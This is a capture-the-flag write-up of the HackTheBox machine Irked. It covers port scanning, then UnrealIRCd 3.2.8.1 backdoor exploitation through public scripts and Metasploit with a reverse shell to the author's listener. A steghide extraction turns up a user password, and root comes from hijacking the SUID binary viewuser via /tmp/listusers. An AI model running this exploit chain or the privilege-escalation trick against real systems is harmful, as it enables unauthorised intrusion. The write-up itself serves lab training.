
Add machine ip to `hosts` file.

![[HackTheBox/Irked/images/1.png]]

Conduct port scan against `irked.htb`

`sudo nmap -sV -p- --max-rate 10000 irked.htb`

![[HackTheBox/Irked/images/2.png]]

Well I'll check web server directly ->

I don't have background knowledge about `IRC`. That is why, let's check

![[HackTheBox/Irked/images/3.png]]

***[IRC](https://en.wikipedia.org/wiki/IRC)** (**Internet Relay Chat**) is a text-based chat system for [instant messaging](https://en.wikipedia.org/wiki/Instant_messaging "Instant messaging").

Conducting fuzzing operation ->

`dirb http://irked.htb`

![[HackTheBox/Irked/images/4.png]]

`dirsearch -u http://irked.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

![[HackTheBox/Irked/images/5.png]]

Poor results lets give a second shot to port scanning results.

`rpcbind 2-4 (RPC #100000)` did not have exploit.

`rpcbind` demonstrated that only three exploits straightforwardly causing disruption of service.

`searchsploit "rpcbind"`

![[HackTheBox/Irked/images/6.png]]

`searchsploit "UnrealIRCd"`

![[HackTheBox/Irked/images/7.png]]

I don't use `msf` exploits anymore because of my preparation of OSCP. In order to access machine use first and third one as an exploit.

[Unreal IRCD version 3.2.8.1 remote command execution exploit.](https://gist.github.com/tylur/50cee76a225c1fc3c96f952f90e1136a)

I faced with a simple issue while I was executing exploit:

![[HackTheBox/Irked/images/9.png]]

`print "!#@#@! h4ck1ng is just Unreal #@!#%%\n"`

The highlighted section leading error ,so I'll change the python version or refactor code to compatible for `python3`

![[HackTheBox/Irked/images/8.png]]

I found another one works great.

[UnrealRCE](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py)

Alter ip and port positions accordingly.

![[HackTheBox/Irked/images/10.png]]

6697, 8067 were assigned for IRC

```bash
└─# python irc.py 10.129.7.101 6697 -payload bash
^CTraceback (most recent call last):
  File "/home/kali/Desktop/irc.py", line 54, in <module>
    data = s.recv(1024)
KeyboardInterrupt
```

The exploit did not want to wait for connection. I discovered a readme file ->

[RCE](https://github.com/kevinpdicks/UnrealIRCD-3.2.8.1-RCE)

The guy referring to an exploit from a ProvingGrounds machine called `SunsetNoontide`.

Then I found the writeup of the machine from ->

https://cyberarri.com/2024/03/30/sunset-noontide-redo-pg-play-writeup/

The guy mentions about the exploit:

https://github.com/chancej715/UnrealIRCd-3.2.8.1-Backdoor-Command-Execution/blob/main/script.py

`python3 script.py <target> <tport> <listener> <lport>`

I could not get reverse shell it stucks, I shifted my approach to `msfconsole`

Use -> https://khadkadevraj100.medium.com/exploiting-vulnerability-unreal-ircd-backdoor-6c8f35a0111c

```
msfconsole
search "unreal"
use 5
```

![[HackTheBox/Irked/images/11.png]]

```bash
show options
set RHOSTS 10.129.7.101
set CHOST 10.10.16.64
set CPORT 4444
```

I got payload selection error.

```bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[-] 10.129.7.101:8067 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > 
```

`show payloads`
`set PAYLOAD 8`

![[HackTheBox/Irked/images/12.png]]

The exploit did not work on `6697` ,so I decided to reset machine move manual exploit again.

https://github.com/chancej715/UnrealIRCd-3.2.8.1-Backdoor-Command-Execution/blob/main/script.py

`python3 script.py 10.129.7.169 8067 10.10.16.64 3000`

![[HackTheBox/Irked/images/13.png]]

```bash
which python
/usr/bin/python
which python2
/usr/bin/python2
which python3
/usr/bin/python3
```

We have full python binaries available. Therefore, try upgrade the shell:

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

use `python -c 'import pty; pty.spawn("/bin/bash")'`

![[HackTheBox/Irked/images/14.png]]

`sudo` binary was not assigned ,so I'll ask for HackTricks to conduct light enumeration.

I did not get `user` flag.

![[HackTheBox/Irked/images/15.png]]

I decided to manually check every directories in user's asset.

![[HackTheBox/Irked/images/16.png]]

The clue is clear, lets run `steghid`:

Use it -> https://github.com/cyb0rgdoll/image-steg

`steghide extract -sf irked.jpg`

![[HackTheBox/Irked/images/17.png]]

user pass is ready !

`djmardov:Kab6h+m+bbp2J:HG`

```bash
ircd@irked:/home/djmardov/Documents$ su djmardov
su djmardov
Password: Kab6h+m+bbp2J:HG

djmardov@irked:~/Documents$  
```

Get user flag:

![[HackTheBox/Irked/images/18.png]]

Not possible to run `sudo` binary.

![[HackTheBox/Irked/images/19.png]]

I'll shift `capabilities` & `SUID`.

`strings /usr/bin/viewuser`

check the binary source code. Script uses `setuid`, `system` and great hints about where it tests user permissions.

![[HackTheBox/Irked/images/20.png]]

![[HackTheBox/Irked/images/21.png]]

There were no file named `listusers`. Hence,  I created mine.

```bash
# we don't have sudo itself
echo "/bin/bash" > /tmp/listusers
chmod +x listusers
/usr/bin/viewuser
```

![[HackTheBox/Irked/images/22.png]]

No `sudo` binary available in the case:

```bash
root@irked:/tmp# which sudo
which sudo
root@irked:/tmp#
```

Get root flag from root directory ->

![[HackTheBox/Irked/images/23.png]]


